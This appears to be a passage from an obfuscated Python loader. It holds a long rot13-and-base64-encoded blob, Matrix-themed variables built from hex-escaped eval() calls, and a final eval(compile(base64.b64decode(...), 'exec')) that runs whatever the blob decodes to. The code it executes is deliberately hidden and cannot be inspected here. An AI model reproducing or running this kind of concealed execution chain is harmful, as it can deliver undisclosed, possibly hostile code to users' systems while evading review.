cBnGuuoz5uX2WhLKukHzfeIGZ4IIHepGI1qyycnmp5JUWXHF9urIWSM2xinGO3ZmuQoTZ5DyyUIxAxp2y1rxqkDlgYrHReFR5OrwSiMwqWAxbiEl81q21uBQuQMwIjEl9jBQImY2MwZ2u5E3IOp2ymYl83Dmp3YmSeYmN3Zxf1pmZiY2fipHqmBTIdA3ScY05PGySdIJV9Wjc6nJ9hVQ0tW1k4AmWprQMzKUt3ASk4ZmSprQZmWjchMJ8tCFOyqzSfXPqprQpmKUt2BIk4AmuprQWyKUt2AIk4AzIprQpmKUt3AIk4AmWprQL1KUt1Myk4AmAprQp0KUt3Zyk4ZwuprQLlKUt2BIk4AzIprQLkKUt3Z1k4AwAprQL5KUt2BIk4ZzIprQp1KUt2MIk4AwuprQL1KUt3BSk4AzAprQL5KUt2Ayk4AmyprQV4KUt2MSk4AzMprQplKUt3ZSk4AwuprQL1KUt3AIk4AmAprQV5KUtlBFpcVPftMKMuoPtaKUt2Z1k4AzMprQL0KUt2AIk4AwAprQpmKUtlMIk4AwEprQL1KUt2Z1k4AzMprQL0KUt2AIk4ZwuprQp0KUt3Zyk4AwyprQMyKUt2BIk4AmEprQp5KUtlL1k4ZwOprQquKUt2BIk4AzMprQMyKUtlBFpcVPftMKMuoPtaKUt3Z1k4AwyprQp4KUtlMIk4AwIprQMyKUt3Z1k4AmIprQplKUt2AIk4AJMprQpmKUt3ASk4AmWprQV4KUt2Zyk4AwyprQMyKUt2ZIk4AmAprQLmKUt2BIk4AwyprQWyKUt3AIk4AzIprQL4KUt2AIk4AmuprQMwKUt2BIk4AwMprQp5KUtlBSk4AzMprQplKUt2ZIk4AwAprQMwKUt2AIk4ZwyprQV5WlxtXlOyqzSfXPqprQLmKUt2Myk4AwEprQL1KUt2Z1k4AmAprQWyKUt2ASk4AwIprQLmKUt2Myk4AwEprQL1KUtlBSk4AzWprQL1KUt3BIk4AzEprQLkKUt2Lyk4AwIprQplKUtlZSk4ZzAprQVjKUt3LIk4AwyprQMzKUt2MIk4ZwxaXDcyqzSfXTAioKOcoTHbrzkcLv5xMJAioKOlMKAmXTWup2H2AP5vAwExMJAiMTHbMKMuoPtaKUt2MIk4AwIprQMzWlxcXFjaCUA0pzyhMm4aYPqyrTIwWlxcPt=='
zion = '\x72\x6f\x74\x31\x33'
neo = eval('\x6d\x6f\x72\x70\x68\x65\x75\x73\x20') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x74\x72\x69\x6e\x69\x74\x79\x2c\x20\x7a\x69\x6f\x6e\x29') + eval('\x6f\x72\x61\x63\x6c\x65') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6b\x65\x79\x6d\x61\x6b\x65\x72\x20\x2c\x20\x7a\x69\x6f\x6e\x29')
eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))